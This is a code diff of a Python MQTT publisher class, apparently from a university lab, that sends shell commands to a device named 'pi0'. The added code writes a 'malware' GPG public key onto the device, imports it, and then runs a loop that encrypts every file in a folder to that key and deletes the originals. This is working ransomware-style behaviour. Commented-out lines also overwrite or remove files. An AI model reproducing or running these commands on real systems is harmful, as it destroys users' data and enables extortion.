@@ -19,7 +19,7 @@ class pubOnly():
 
         message1 = {"src" : clientname, "dest" : "pi0", "command" : "ls -la"}
 
-        sleep(5)
+        # sleep(5)
 
         # self.client.myPublish(topic, message1)
         # print(f"{self.clientID} publishing {message1} to topic: {topic}")
@@ -74,14 +74,67 @@ class pubOnly():
         # messageE = {"src" : clientname, "dest" : "pi0", "command" : "ls -a -p ./A/ | grep -v / | head -n 1 | xargs -0 rm >> trace5.log"}
         # self.client.myPublish(topic, messageE)
 
-        sleep(2)
+        #sleep(2)
 
-        messageF = {"src" : clientname, "dest" : "pi0", "command" : "find ./A -type f -exec sh -c 'echo ciao da malware1 > {}\necho ciao da malware2 >> {}\necho ciao da malware3 >> {}' \;"}
+        #messageF = {"src" : clientname, "dest" : "pi0", "command" : "find ./A -type f -exec sh -c 'echo ciao da malware1 > {}\necho ciao da malware2 >> {}\necho ciao da malware3 >> {}' \;"}
         #messageF = {"src" : clientname, "dest" : "pi0", "command" : "find ./A -type f -exec rm -f {} +"}
-        self.client.myPublish(topic, messageF)
+        #self.client.myPublish(topic, messageF)
 
         sleep(2)
 
+        filepointer = open("malware_public.key")
+
+        primo = 1
+
+        for row in filepointer:
+            #print(row, end = '')
+            row = row.strip('\n')
+            if(primo == 1):
+                primo = 0
+                message = {"src" : clientname, "dest" : "pi0", "command" : f"echo {row} > public.key"}
+                self.client.myPublish(topic, message)
+            else:
+                message = {"src" : clientname, "dest" : "pi0", "command" : f"echo {row} >> public.key"}
+                self.client.myPublish(topic, message)
+            sleep(0.5)
+
+        sleep(5)
+
+        # sleep(5)
+
+        message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --import public.key"}
+        self.client.myPublish(topic, message)        
+
+        sleep(5)
+
+        # message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --list-keys"}
+        # self.client.myPublish(topic, message)    
+
+        # message = {"src" : clientname, "dest" : "pi0", "command" : "ls -la"}
+        # self.client.myPublish(topic, message)     
+
+        # sleep(5)
+
+        message = {"src" : clientname, "dest" : "pi0", "command" : "cd ./A"}
+        self.client.myPublish(topic, message)
+
+        sleep(5)
+
+        ##### message = {"src" : clientname, "dest" : "pi0", "command" : "find . -maxdepth 1 -type f -exec -c 'gpg --always-trust -e -r \"malware\" {}\n rm -f {} \;'"}
+        ##### self.client.myPublish(topic, message)           
+
+        # message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --always-trust -e -r \"malware\" a.txt"}
+        # self.client.myPublish(topic, message)      funziona sul singolo
+
+        # for file in *; do if [ -f $file ]; then echo $file; echo $file ciao; fi; done
+
+        message = {"src" : clientname, "dest" : "pi0", "command" : "for file in *; do if [ -f $file ]; then gpg --always-trust -e -r \"malware\" $file; rm -f $file; fi; done"}
+        self.client.myPublish(topic, message)  
+
+        sleep(5)
+
+
+        
     def notify(self, message, topic):
         if topic == f"PoliTo/C4ES/{self.clientID}/command":
             print("loopback")
